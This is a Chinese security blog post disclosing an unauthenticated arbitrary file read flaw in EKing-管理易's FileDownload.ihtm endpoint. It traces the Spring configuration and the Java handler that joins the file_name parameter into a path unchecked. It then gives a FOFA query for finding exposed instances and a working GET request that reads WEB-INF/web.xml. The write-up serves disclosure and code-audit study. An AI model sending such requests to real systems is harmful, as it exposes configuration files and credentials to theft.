---
title: "EKing-管理易 FileDownload.ihtm 任意文件读取漏洞"
source: https://mrxn.net/jswz/eking-FileDownload-handleFileDownload.html
asset_dir: assets/eking-管理易-filedownload.ihtm-任意文件读取漏洞
---

# EKing-管理易 FileDownload.ihtm 任意文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/24 18:37
- 769浏览
- [0评论](#comment)
- 57分钟阅读

深入探索

开发

SQL

软件

---

# 漏洞简介

EKing-管理易是一款专为广告制品制作企业量身定制的管理[软件](#)产品，由广州易凯软件技术有限公司开发,管理易基于久经考验的JAVA企业版技术研发，汇聚了数百家行业用户的管理精髓，旨在帮助广告装饰、有机工艺、展览展示、有机丝印、喷绘写真等广告标识制作企业实现规范化、科学化管理，提升运营效率，降低运营成本。EKing-管理易系统 `FileDownload.ihtm` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

漏洞扫描服务

# 影响版本

# fofa语法

> `app="EKing-管理易"`

# 漏洞分析

先看 web.xml 当中定义并配置Spring的核心Servlet——DispatcherServlet 部分

```
<context-param>
    <param-name>contextConfigLocation</param-name>
    <param-value>/WEB-INF/applicationContext.xml,/WEB-INF/DAOs.xml,/WEB-INF/Spring-Hibernate.xml,/WEB-INF/Validators.xml,/WEB-INF/Interceptors.xml,/WEB-INF/Services.xml,/WEB-INF/Transactions.xml</param-value>
</context-param>
<servlet>
    <servlet-name>Dispatcher</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <init-param>
       <param-name>contextConfigLocation</param-name>
       <param-value>/WEB-INF/Url-Mapping.xml,/WEB-INF/Controllers.xml</param-value>
    </init-param>
    <load-on-startup>2</load-on-startup>
</servlet>
<!-- lin end -->

<!-- lin start -->
<servlet-mapping>
    <servlet-name>Dispatcher</servlet-name>
    <url-pattern>*.ihtm</url-pattern>
</servlet-mapping>
```

- `<servlet-class>`：指定Servlet的实现类为`org.springframework.web.servlet.DispatcherServlet`，这是Spring MVC的核心组件，负责将请求分发到相应的控制器。
- `<init-param>`：为`DispatcherServlet`配置初始化参数。
  - `contextConfigLocation`：指定`DispatcherServlet`的配置文件路径。
  - `param-value`：列出了`DispatcherServlet`的配置文件，通常包括URL映射和控制器定义。
  - `Url-Mapping.xml`：定义URL与控制器方法的映射。
  - `Controllers.xml`：定义控制器Bean。
- `<servlet-name>`：指定要映射的Servlet名称为`Dispatcher`。
- `<url-pattern>`：定义URL匹配模式，`*.ihtm`表示所有以`.ihtm`结尾的URL请求都由`DispatcherServlet`处理。
  - 例如，`/Main.ihtm`、`/TopMenu.ihtm`等请求都会被`DispatcherServlet`处理。

再看 Controllers.xml

物流软件安全

```
<bean id="commonMACtr" class="com.minierp.controller.CommonMACtr">
    <property name="methodNameResolver">
       <bean
          class="org.springframework.web.servlet.mvc.multiaction.PropertiesMethodNameResolver">
          <property name="mappings">
             <props>
                <prop key="/FileDownload.ihtm">handleFileDownload</prop>
```

- `<bean id="commonMACtr" class="com.minierp.controller.CommonMACtr">`：定义了一个Bean，其ID为`commonMACtr`，类为`com.minierp.controller.CommonMACtr`。这个Bean是一个控制器类，用于处理HTTP请求。
- `<property name="methodNameResolver">`：为`commonMACtr` Bean设置了一个属性`methodNameResolver`，该属性用于解析请求URL并映射到相应的方法。
  - `<bean class="org.springframework.web.servlet.mvc.multiaction.PropertiesMethodNameResolver">`：定义了一个`PropertiesMethodNameResolver`类型的Bean，用于根据URL路径解析方法名。
  - `<property name="mappings">`：设置了`mappings`属性，该属性包含了URL路径与方法的映射关系。
    - `<props>`：定义了一组属性（键值对），每个`<prop>`元素表示一个URL路径与方法的映射。
    - `<prop key="/WW_verify_*.txt">handleWwTxtUrl</prop>`：表示当请求的URL匹配`/WW_verify_*.txt`时，调用`handleWwTxtUrl`方法。
    - `<prop key="/RandomImageCode.ihtm">handleRandomImageCode</prop>`：表示当请求的URL匹配`/RandomImageCode.ihtm`时，调用`handleRandomImageCode`方法。
    - 其他`<prop>`元素类似，分别定义了不同URL路径与方法的映射关系。

当访问 FileDownload.ihtm 时，进入 handleFileDownload 处理，业务逻辑如下

软件

```
public ModelAndView handleFileDownload(HttpServletRequest request, HttpServletResponse response) throws Exception {
    String fileName = request.getParameter("file_name");
    String sourceName = request.getParameter("source_name");
    String type = request.getParameter("type");
    UserBean ub = EncCommonHelper.getCurrentUserAccount(request);
    String path = this.getServletContext().getRealPath("/");
    if (!path.endsWith(File.separator)) {
        path = path + File.separator;
    }

    if (ub != null && type != null && type.equals("PRIVATE")) {
        path = path + "priv_download" + File.separator + ub.getUser().getStafferId() + File.separator;
    }

    File file = new File(path + fileName);
    FileInputStream is = null;
    ServletOutputStream out = null;
    if (ub != null && file.exists() && file.isFile()) {
        try {
            if (sourceName == null || sourceName.equals("")) {
                sourceName = file.getName();
            }

            response.setCharacterEncoding("utf-8");
            response.setContentType("APPLICATION/OCTET-STREAM");
            String[] tmpArr = sourceName.split(" ");
            String attaName = "";

            for(int i = 0; i < tmpArr.length; ++i) {
                attaName = attaName + " " + URLEncoder.encode(tmpArr[i], "utf-8");
            }

            response.setHeader("Content-Disposition", "attachment; filename=\"" + attaName + "\"");
            is = new FileInputStream(file);
            out = response.getOutputStream();
            byte[] b = new byte[1024];

            for(int len = is.read(b); len != -1; len = is.read(b)) {
                out.write(b, 0, len);
            }

            out.flush();
        } finally {
            if (is != null) {
                is.close();
            }

            if (out != null) {
                out.close();
            }

        }
    } else {
        String errMsg = "No login or file not exist!";

        try {
            response.setCharacterEncoding("utf-8");
            response.setContentType("text/plain");
            out = response.getOutputStream();
            out.write(errMsg.getBytes());
            out.flush();
        } finally {
            if (out != null) {
                out.close();
            }

        }
    }

    return null;
}
```

接收 `file_name` 参数的值后 直接拼接进路径后，调用 `File file = new File(path + fileName);` 创建文件流读取后直接写入响应body，无任何过滤或校验，造成[任意文件读取漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
GET /FileDownload.ihtm?file_name=WEB-INF/web.xml HTTP/1.1
Host: eking.mrxn.net
```

成功读取到 web.xml 内容

网络安全

[![EKing-管理易 FileDownload.ihtm 任意文件读取漏洞](images/img-001-930aaf59754e.webp)](https://image.mrxn.net/68dec2b416274e86b0f4f62bb0123676.webp)

# 参考

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [6.参考](#toc-6-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALdElEQVR4AeycjXL0tg5Dc/r+7/zdMujxSrRlb5I2u3PHmbIQAZBSRLv5m+lfHx8ff74Tf/75sPafdAP5K9wK2sI66atc34i9ZtRq3XXzjuWtkK/1GJ03/w7WQP6uu/95lxvYBvL3xD+eidXBgQ94RPfZu/OQGnn4Wm5dIcy1xX0n+llh7gvJIbjawz5XONZvAxnJe/26G9gNBDJ1mHF1RKd/pUP6dd+qXl60rufyR7jyQs6iDsl7D/UVdv8qh/SHGY/8u4EcmW7u927gxwOBTN2n6NmjX/khfSGoH+b8aD+IRw3mvPP2FuHYb11H6zr/nfzHA/nOpnfN+gb+tYHA/FT51MDMexQID0H5jqs+kDp4YK+FaPZQNxfl4div3rHXd/07+b82kO9sftfsb2A3EKfecV86M5P/z5/tZxJdXe855OnU31G/vPkR6ukI2QOCXTeHn+n2EY/OWJz6iLuBjOK9/v0b2AYCeSrgHK+OCKmvJ6Ci+yG6PCQvb4V8rSsgunxHiA50afvNA/D5xla/im6E5/ReZw6pNxchPJyj/sJtIJXc8fob+KuemO+ER7fWvGPXe64f8hSZi/rhXC+fNSLMNTDn+q6weldA6mtdYV2tK3pe3FfjfkO8xTfB5UAgT0M/Jxzz+nwiID4Iqosw89aJ3bfiIX3ggdaK1oryVwiPnsDuaxJEX/WB6DCjfph54GM5kI/74yU38BfspwRshwE+v0OBoE8ZJIegBTDnV/5ndfuL1h2hHhFyJgh23h7y5h1XuvwKex+YzzHW3W/IeBtvsN59l+WZnKq5CPN0Vz79Yvf1vPsg+8CGn2/qqq7qId5aj3FWUz6Y6+A4h+f46lnhvjDXyZenx/2G9Bt5cb59DenngHmq6n26cOzTDz/T7eO+kH6wRz2itRCveUf9EJ+5PnMRZl/nrYPZJy9aN+L9hng7b4K7gTit1fngfOrW2UeEuQ7mfOXrvP1F9UK5FZanYqXLQ84GQfkrrN4VMNfBnJ/12Q3kzHxr//0NbAOBeYo16Yp+hOIqOg+pL62i68VVdH6VQ/pBUF/1qDCH6PBAtfJVmIvFjSG/Qnj0hvVP7BDf2Htc9/4Q/8hvAxnJe/26G9h+DvEIsJ+aWiFEh6BPQGkVEB6CxVXAnFsHx3zVHAXEb/2I3Q+zF5LDMfb6sfe4htSPXK17PcQHwa5XTQVEB+7fZX282cfuP1k1sQrI1DxvcWPIdxw9tYb0qXWFfghvLkL48lbI17rCHOKDB5ZeoafWFeZicRWf+fCv4iqkIL3NO0J0CHZ9lcPsrz2N3UBWTW7+d25gORAn1o8BmW7XzSE6BOXtAzOvDuH1ieo973zpkB4QLK4CzvOjXlVnQOoh2P09h2Of/fRDfPKFy4GUeMfv38A2EKfmESDTk4fjXP8KIXUQ7P0gvPXq5hAdZlTXf4R6rhDSe+Xrvb/qsx6yDwSP+G0gq01u/ndvYBsIZGoQ7NPzWDDrK956UV9HdRHSH4LyovUQ3XxEiAZBa8XR+8wa0kcvHOcQHma0ru8P8akXbgOp5I7X38D295Cr6amLHh0yZXlIDjPq/ypC+ljnPuYQHR6ophceGjx+F6WuH+LrfNfNV9jrIX1X/pG/35DxNt5gvRtIn24/I2TaEOx+c3FVv+Kt69j95t1XudqzWDVjwPHntupnrTrw+fd/c3WY+8qPuBuITW58zQ1sv+2FTA+CHsfpQXhzdQgPM6rrFzu/yiH91GHOOw9IbQhMT6oCHPPqnhXiM+/6s3yvM4f0hwfeb4i38ya4DaRP2/NBprfK5VcIqYdg98HMw5zr93xwrJcP1lrp9hDh2A/HfPU4CogfZtQLx7z6iNtARvJev+4GtoFApuhRfIp6Li+qd4S5n3qvu8qtg7mfdUdoTdfkIb3UITkE9XVdXoRjv3Wi/lUuX7gNxKIbX3sDXx4IzE/F6vg17Qr1WleYw3EfOOat6wjxA136/A4L2GGdo2JX0AhIrXTVVKxyeZjrnuWB+2/qH2/28eU35M3O/393nOUvF+szPYp6ZSuOtOJKq6h1Ra0ral0B8+sMc16eiqqpgOi1rihtjOKMka/1ii+tAube3W8uVs0zsfLLQ/a1l3zh/YZ4K2+Cu1+drM4FmSrM2P1wrEN4/fU0VJjDrMuXpwJmHZLDHq2FaFVfccWrl7fCHNJnlXce4oeguli9KyA6PPB+Q7ylN8HdQGpyFZCp9XOWVrHiSxsD0mfkag3HfO9rXjXPRq+B7CUvwszDnOvr6Dlg9svrNxflRfkRdwPRfONrbmD7LsvtIVN3avIizHr3QXT9HSH6VR3EZz0khxnVn8G+Z897D8henTdf1ctD6iFoHRznwP2D4cebfWzfZXmuPl3zjnA8ZX3269h1mPuoi9abi/JnCHNvSG4PSG4PeXOx85A6COoTIbx1Isy8/hHvryHjbbzBehuIU+xngkxVHp7LYfY96o95dRGe8+k/Qj+njvCz3r2fe8NzfSE+CFpfuA2kkjtefwPbd1mwn1Ydz6cBopuL5akw71haBcz1xX0lIPUQdB9IDizbAZ+/gu8Ge3T+Koe5n31E6yE+CHZd34j3GzLexhusd99lQabp2SC504XkENQnQngIWqcuQnRzfTDzXe8+88Luvcohe8GMqzqIr/aq0AfhzcXyVJiLxa3ifkO8pTfBbSBOzHP1HPIUyHe0TlSHuQ7mXJ91YuchdeoihIc16hUhXnNxtSfEv9KtF7uv55B+sMdtIDa78bU3sA0EMq0+TY8nD/HJixC++1Z5r4O5vuvmon3NR1QTIb0hqFddhOgQ7D445vVBdAhe8eojbgMZyXv9uhvYBtKfEo8k33OYnwL1jhBf7wPHvPVwruuz74iQ2jNP+dUh/uIq5GtdscrlxfKOAem70o/4bSCKN772BraBQKbphD0WhIcZu09/xysfpK91kNw6mHN9zyCkFo5x1cO91eG8Xj/EZ528KH+G20DOTLf2ezewGwjMU+5HuZo2zPVwntuvo/vKm4sw9y0eZs7ajuWtgPjVixsDjvXuh/jG2lrDzENyCJanApID918MP97sY/eG9On3HDJNPw+Yc/3ilU99hZD+ENTX+8ufITzXA+Lre5hDdPeSFyF6z/Wf4W4gZ+Zb++9vYDcQyHQh6BGctijfEc7rrIf44Bh7317X9THvXsgeo6fWEB5mXNVDfOrVYwyIPnJHa+vF0bMbyCje69+/ge0vhn3ro+mVB/IUQLD7zCE6zFg9nglInV44ziE8oPXzr4Pw+F9oKHi2VS7/wHllPfC5hyrM+RV/pt9viLfzJrj9xdDpi6vzqYtw/HSod4Rzv/taZ95R/Qi71xye21t/7w3H9Su/9V1f5cXfb0jdwhvF9jUEMn14Dv0c+lMAc72+jtaJkDrz7l/lkDpgZwGm/9b33hAdgjaA5BCU7wjHOhzz1kN0CMoX3m9I3cIbxTYQn54rvDp7r7/yQ54S67p/xetTL5RbIcx7VU2F/lqPIQ+pM79Ce1z5jvRtIEfizf3+DewGAnkaYMZnjwbndaunB1LnPjDn8iJEhz3qWe2lLq58K35VB/uzANo/v57B4+cj+4+4G8hWfS9ecgM/HgjwOXmn3D8LiC4Pcy7f0X4Qv/nKpz4ipLbXmMOsw3k+9q41xF/rMezfUY88pN688McDqSZ3/Hs38OOBOHXItM37ESF653sO8UGw6/YXu145zLUrrzzE3/PqVbHiS6uA1Ne6Qr9Y3FlA6oH7L4Yfb/axe0Ocaserc+vvPnlRHfJUdF79CiH18MBVDcTTdQi/OoM8nPvsC/GZd4RZt/+Iu4H0Jnf+uzewDQQyPTjHZ4/n1PVD+pqv0DrxWV/5IXvUusLaWleYQ3yrvLwVcO6zvrxjyIujVmt5SH944DYQTTe+9gbugbz2/ne7/w8AAP//idSzwgAAAAZJREFUAwAmfcKegWlrAAAAAABJRU5ErkJggg==)

手机扫码阅读
